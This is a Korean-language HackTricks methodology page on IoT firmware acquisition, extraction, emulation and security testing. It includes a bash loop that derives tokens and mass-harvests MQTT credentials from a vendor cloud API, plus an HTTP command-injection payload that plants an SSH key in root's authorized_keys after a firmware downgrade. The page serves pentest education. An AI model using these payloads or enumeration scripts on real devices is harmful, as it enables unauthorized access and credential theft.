# 펌웨어 분석

{{#include ../../banners/hacktricks-training.md}}

## **소개**

### 관련 리소스


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

펌웨어는 하드웨어 구성요소와 사용자가 상호작용하는 소프트웨어 간의 통신을 관리하고 촉진함으로써 장치가 올바르게 동작하도록 하는 필수 소프트웨어입니다. 영구 메모리에 저장되어 전원이 켜지는 순간부터 장치가 필수 명령을 접근할 수 있게 하여 운영체제의 부팅으로 이어집니다. 펌웨어를 검토하고 잠재적으로 수정하는 것은 보안 취약점을 식별하는 데 중요한 단계입니다.

## **정보 수집**

**정보 수집**은 장치의 구성과 사용되는 기술을 이해하기 위한 초기의 중요한 단계입니다. 이 과정에서는 다음과 같은 데이터를 수집합니다:

- CPU 아키텍처 및 실행되는 운영체제
- 부트로더 세부사항
- 하드웨어 배치 및 데이터시트
- 코드베이스 메트릭 및 소스 위치
- 외부 라이브러리 및 라이선스 종류
- 업데이트 이력 및 규제 인증
- 아키텍처 및 흐름도
- 보안 평가 및 식별된 취약점

이를 위해 **오픈소스 인텔리전스 (OSINT)** 도구는 매우 유용하며, 사용 가능한 오픈소스 소프트웨어 구성요소에 대한 수동 및 자동 검토를 통한 분석도 중요합니다. [Coverity Scan](https://scan.coverity.com) 및 [Semmle’s LGTM](https://lgtm.com/#explore) 같은 도구는 잠재적 문제를 찾는 데 활용할 수 있는 무료 정적 분석을 제공합니다.

## **펌웨어 획득**

펌웨어를 획득하는 방법에는 복잡도별로 여러 방식이 있습니다:

- **직접** 출처(개발자, 제조업체)로부터
- **빌드** 제공된 지침에 따라 빌드
- **다운로드** 공식 지원 사이트에서 다운로드
- **Google dork** 쿼리를 활용해 호스팅된 펌웨어 파일 찾기
- **클라우드 스토리지**에 직접 접근(예: [S3Scanner](https://github.com/sa7mon/S3Scanner))
- man-in-the-middle 기법으로 **업데이트** 가로채기
- **추출**: 장치에서 **UART**, **JTAG**, **PICit** 같은 연결을 통해
- **Sniffing**: 장치 통신 내의 업데이트 요청 탐지
- **하드코딩된 업데이트 엔드포인트** 식별 및 사용
- **Dumping**: 부트로더나 네트워크에서 덤프
- 모든 방법이 실패할 경우 적절한 하드웨어 도구를 사용해 **스토리지 칩 제거 및 판독**

## 펌웨어 분석

이제 **펌웨어를 확보했으므로**, 어떻게 다룰지 알기 위해 정보를 추출해야 합니다. 이를 위해 사용할 수 있는 다양한 도구들:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
만약 그 도구들로 많은 것을 찾지 못했다면 `binwalk -E <bin>`로 이미지의 **엔트로피(Entropy)**를 확인하세요. 엔트로피가 낮으면 암호화되어 있을 가능성은 낮고, 엔트로피가 높으면 암호화되어 있거나(또는 어떤 방식으로든 압축되어 있을) 가능성이 큽니다.

또한, 이러한 도구들을 사용해 펌웨어에 포함된 **파일들(embedded inside the firmware)**을 추출할 수 있습니다:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

또는 파일을 검사하기 위해 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/))를 사용할 수 있습니다.

### 파일시스템 얻기

이전의 예시 도구들(예: `binwalk -ev <bin>`)로 **파일시스템을 추출**했어야 합니다.\
Binwalk는 일반적으로 이를 **파일시스템 타입 이름으로 된 폴더** 안에 추출합니다. 보통 다음 중 하나입니다: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 수동 파일시스템 추출

때때로 binwalk의 시그니처에 파일시스템의 **매직 바이트(magic byte)**가 포함되어 있지 않을 수 있습니다. 이런 경우에는 binwalk를 사용해 **파일시스템의 오프셋을 찾고 바이너리에서 압축된 파일시스템을 카빙(carve)**한 다음, 아래 단계에 따라 파일시스템 타입에 맞게 **수동으로 추출**하세요.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
다음 **dd command**를 실행하여 Squashfs filesystem을 carving 하세요.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
또는 다음 명령을 실행할 수도 있습니다.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs의 경우 (위 예제에서 사용됨)

`$ unsquashfs dir.squashfs`

파일은 이후에 `squashfs-root` 디렉터리에 있게 됩니다.

- CPIO 아카이브 파일의 경우

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 파일시스템의 경우

`$ jefferson rootfsfile.jffs2`

- NAND flash가 있는 ubifs 파일시스템의 경우

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 펌웨어 분석

펌웨어를 획득한 후에는 그 구조와 잠재적 취약점을 이해하기 위해 분해하여 분석하는 것이 필수적입니다. 이 과정에는 펌웨어 이미지에서 유용한 데이터를 분석·추출하기 위한 다양한 도구의 사용이 포함됩니다.

### 초기 분석 도구

바이너리 파일(여기서는 `<bin>`이라 칭함)을 초기 검사하기 위한 명령들이 제공됩니다. 이 명령들은 파일 유형 식별, 문자열 추출, 바이너리 데이터 분석, 파티션 및 파일시스템 세부 정보 파악에 도움이 됩니다:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
이미지의 암호화 상태를 평가하기 위해, `binwalk -E <bin>`로 **엔트로피**를 검사합니다. 엔트로피가 낮으면 암호화가 없을 가능성을 시사하고, 엔트로피가 높으면 암호화나 압축이 적용되었을 가능성을 나타냅니다.

임베디드 파일을 추출하기 위해서는 **file-data-carving-recovery-tools** 문서와 파일 검사용 **binvis.io** 같은 도구와 리소스를 권장합니다.

### 파일시스템 추출

대부분 `binwalk -ev <bin>`를 사용하면 보통 파일시스템을 추출할 수 있으며, 추출된 디렉터리는 종종 파일시스템 타입 이름(예: squashfs, ubifs)으로 생성됩니다. 그러나 magic 바이트가 없어서 **binwalk**가 파일시스템 타입을 인식하지 못하는 경우에는 수동 추출이 필요합니다. 이 경우 `binwalk`로 파일시스템의 오프셋을 찾고, 이어서 `dd` 명령으로 파일시스템을 carve하여 추출합니다:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
그 후, 파일시스템 타입(예: squashfs, cpio, jffs2, ubifs)에 따라 내용을 수동으로 추출하기 위해 서로 다른 명령을 사용합니다.

### 파일시스템 분석

파일시스템을 추출한 후에는 보안 결함을 찾는 작업이 시작됩니다. 불안전한 네트워크 데몬, 하드코딩된 자격증명, API 엔드포인트, 업데이트 서버 기능, 컴파일되지 않은 코드, 시작 스크립트, 오프라인 분석을 위한 컴파일된 바이너리 등에 주의를 기울입니다.

**확인해야 할 주요 위치** 및 **항목**은 다음과 같습니다:

- **etc/shadow** 및 **etc/passwd**: 사용자 자격증명 확인
- **etc/ssl**의 SSL 인증서 및 키
- 잠재적 취약점이 있는 설정 및 스크립트 파일
- 추가 분석을 위한 임베디드 바이너리
- 일반적인 IoT 장치의 웹 서버 및 바이너리

파일시스템 내부의 민감한 정보와 취약점을 찾아내는 데 도움이 되는 도구들:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 및 [**Firmwalker**](https://github.com/craigz28/firmwalker): 민감한 정보 검색용
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core): 종합적인 펌웨어 분석용
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), 및 [**EMBA**](https://github.com/e-m-b-a/emba): 정적 및 동적 분석용

### 컴파일된 바이너리에 대한 보안 점검

파일시스템에서 발견된 소스 코드와 컴파일된 바이너리 모두 취약점 여부를 꼼꼼히 검토해야 합니다. Unix 바이너리에는 **checksec.sh**, Windows 바이너리에는 **PESecurity** 같은 도구가 있어 악용될 수 있는 보호되지 않은 바이너리를 식별하는 데 도움이 됩니다.

## 파생된 URL 토큰을 이용한 클라우드 구성 및 MQTT 자격증명 수집

많은 IoT 허브는 장치별 구성을 다음과 같은 형태의 클라우드 엔드포인트에서 가져옵니다:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

펌웨어 분석 중에 <token>이 하드코딩된 비밀을 사용해 device ID로부터 로컬에서 파생된다는 것을 발견할 수 있습니다. 예를 들면:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

이 설계는 deviceId와 STATIC_KEY를 알게 된 누구나 URL을 재구성하여 클라우드 구성을 가져올 수 있도록 하며, 종종 평문 MQTT 자격증명과 토픽 접두사를 드러냅니다.

실무 워크플로:

1) UART 부트 로그에서 deviceId 추출

- 3.3V UART 어댑터(TX/RX/GND)를 연결하고 로그를 캡처:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 클라우드 구성 URL 패턴과 브로커 주소를 출력하는 라인을 찾아보세요. 예를 들어:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) 펌웨어에서 STATIC_KEY와 token 알고리즘 복구

- 바이너리를 Ghidra/radare2에 로드하고 구성 경로 ("/pf/") 또는 MD5 사용을 검색한다.
- 알고리즘을 확인한다 (예: MD5(deviceId||STATIC_KEY)).
- Bash에서 token을 도출하고 digest를 대문자로 변환한다:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) 클라우드 구성 및 MQTT 자격 증명 수집

- URL을 구성하고 curl로 JSON을 가져온 후 jq로 파싱해 시크릿을 추출:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 평문 MQTT 및 약한 topic ACLs 악용(존재하는 경우)

- 복구된 자격 증명을 사용하여 maintenance topics를 구독하고 민감한 이벤트를 확인한다:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 예측 가능한 디바이스 ID 열거 (대규모, 권한 있는 상태)

- 많은 에코시스템은 vendor OUI/product/type 바이트를 포함하고 그 뒤에 연속적인 접미사가 붙습니다.
- 후보 ID를 순회(iterate)하여 토큰을 도출(derive)하고, 프로그래밍 방식으로 configs를 가져올 수 있습니다:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
노트
- mass enumeration을 시도하기 전에 항상 명시적인 허가를 받으세요.
- 가능하면 대상 하드웨어를 수정하지 않고 secrets를 복구하기 위해 emulation이나 static analysis를 선호하세요.

firmware를 emulation하는 과정은 디바이스의 동작 또는 개별 프로그램에 대한 **dynamic analysis**를 가능하게 합니다. 이 접근법은 hardware 또는 architecture 의존성으로 인해 어려움이 있을 수 있지만, root filesystem이나 특정 binaries를 Raspberry Pi와 같이 architecture와 endianness가 일치하는 디바이스나 사전 구축된 virtual machine으로 옮기면 추가 테스트를 용이하게 할 수 있습니다.

### Emulating Individual Binaries

단일 프로그램을 검사할 때는 프로그램의 endianness와 CPU architecture를 식별하는 것이 중요합니다.

#### MIPS Architecture 예시

MIPS architecture binary를 emulate하려면 다음 명령을 사용할 수 있습니다:
```bash
file ./squashfs-root/bin/busybox
```
그리고 필요한 에뮬레이션 도구를 설치하려면:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS(빅엔디안)용에는 `qemu-mips`를 사용하며, 리틀엔디안 바이너리의 경우 `qemu-mipsel`을 사용합니다.

#### ARM Architecture Emulation

ARM 바이너리의 경우 과정은 유사하며 `qemu-arm` 에뮬레이터를 사용합니다.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, 전체 펌웨어 에뮬레이션을 용이하게 하여 프로세스를 자동화하고 동적 분석을 지원합니다.

## Dynamic Analysis in Practice

이 단계에서는 실제 장치 환경 또는 에뮬레이터 환경을 사용해 분석을 진행합니다. OS와 파일시스템에 대한 shell 접근을 유지하는 것이 중요합니다. 에뮬레이션은 하드웨어 상호작용을 완벽히 모사하지 못할 수 있어 가끔 에뮬레이션을 재시작해야 할 필요가 있습니다. 분석 시 파일시스템을 재검토하고, 노출된 웹페이지와 네트워크 서비스를 공략하며, 부트로더 취약점을 탐색해야 합니다. 펌웨어 무결성 검사는 잠재적 백도어 취약점을 식별하는 데 중요합니다.

## Runtime Analysis Techniques

런타임 분석은 프로세스나 바이너리를 실제 실행 환경에서 상호작용하며 분석하는 것을 말합니다. gdb-multiarch, Frida, Ghidra 같은 도구를 사용해 breakpoints를 설정하고 fuzzing 등 기법을 통해 취약점을 식별합니다.

## Binary Exploitation and Proof-of-Concept

식별된 취약점에 대한 PoC를 개발하려면 대상 아키텍처에 대한 깊은 이해와 저수준 언어로의 프로그래밍 능력이 필요합니다. 임베디드 시스템에서는 바이너리 런타임 보호가 드물지만, 존재할 경우 Return Oriented Programming (ROP) 같은 기법이 필요할 수 있습니다.

## Prepared Operating Systems for Firmware Analysis

운영체제들인 [AttifyOS](https://github.com/adi0x90/attifyos)와 [EmbedOS](https://github.com/scriptingxss/EmbedOS)는 펌웨어 보안 테스트에 필요한 도구들이 사전 구성된 환경을 제공합니다.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS는 Internet of Things (IoT) 장치의 보안 평가 및 penetration testing을 돕기 위해 설계된 배포판입니다. 필요한 도구들이 모두 로드된 사전 구성된 환경을 제공하여 많은 시간을 절약해줍니다.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 기반으로 펌웨어 보안 테스트 도구들이 미리 로드된 임베디드 보안 테스트 운영체제입니다.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

제조사가 펌웨어 이미지에 대해 암호화 서명 검증을 구현하더라도, **version rollback (downgrade) protection is frequently omitted**. 부트로더나 리커버리 로더가 임베디드된 공개키로 서명만 확인하고 플래시하려는 이미지의 *version* (또는 단조 증가 카운터)을 비교하지 않을 경우, 공격자는 합법적으로 **여전히 유효한 서명을 가진 오래된 취약한 펌웨어를 설치**할 수 있어 패치된 취약점을 다시 도입할 수 있습니다.

Typical attack workflow:

1. **Obtain an older signed image**
* 제조사의 공개 다운로드 포털, CDN 또는 지원 사이트에서 획득합니다.
* 동반 모바일/데스크톱 애플리케이션에서 추출합니다(예: Android APK 내 `assets/firmware/`).
* VirusTotal, 인터넷 아카이브, 포럼 등 타사 저장소에서 검색합니다.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, 등.
* 많은 소비자용 IoT 기기들은 *unauthenticated* HTTP(S) 엔드포인트를 노출하여 Base64-encoded된 펌웨어 블랍을 받아 서버 측에서 디코드한 후 리커버리/업그레이드를 트리거합니다.
3. 다운그레이드 후, 최신 릴리스에서 패치된 취약점(예: 이후에 추가된 command-injection 필터)을 공략합니다.
4. 선택적으로 최신 이미지를 다시 플래시하거나 업데이트를 비활성화하여 persistence를 얻은 이후 탐지를 피합니다.

### 예: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
취약한(다운그레이드된) 펌웨어에서는 `md5` 파라미터가 정제 없이 셸 명령에 직접 이어붙여져 임의의 명령을 주입할 수 있다(여기서는 SSH 키 기반의 root 접근을 활성화함). 이후 펌웨어 버전에서는 기본적인 문자 필터가 도입되었지만, 다운그레이드 보호가 없어 해당 수정은 무의미하다.

### 모바일 앱에서 펌웨어 추출하기

많은 벤더는 동반 모바일 애플리케이션 안에 전체 펌웨어 이미지를 번들로 포함하여 앱이 Bluetooth/Wi-Fi를 통해 장치를 업데이트할 수 있도록 한다. 이러한 패키지는 보통 APK/APEX의 `assets/fw/`나 `res/raw/` 같은 경로에 암호화되지 않은 상태로 저장된다. `apktool`, `ghidra`, 또는 단순한 `unzip`과 같은 도구를 사용하면 물리적 하드웨어를 건드리지 않고 서명된 이미지를 추출할 수 있다.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### 업데이트 로직 평가 체크리스트

* Is the transport/authentication of the *update endpoint* adequately protected (TLS + authentication)?
* Does the device compare **version numbers** or a **monotonic anti-rollback counter** before flashing?
* Is the image verified inside a secure boot chain (e.g. signatures checked by ROM code)?
* Does userland code perform additional sanity checks (e.g. allowed partition map, model number)?
* Are *partial* or *backup* update flows re-using the same validation logic?

> 💡  위 항목 중 하나라도 누락되어 있으면, 플랫폼은 rollback attacks에 취약할 가능성이 큽니다.

## 연습용 취약 펌웨어

펌웨어에서 취약점을 찾아보는 연습을 위해 다음의 취약한 펌웨어 프로젝트들을 시작점으로 사용하세요.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 참고자료

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## 교육 및 인증

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
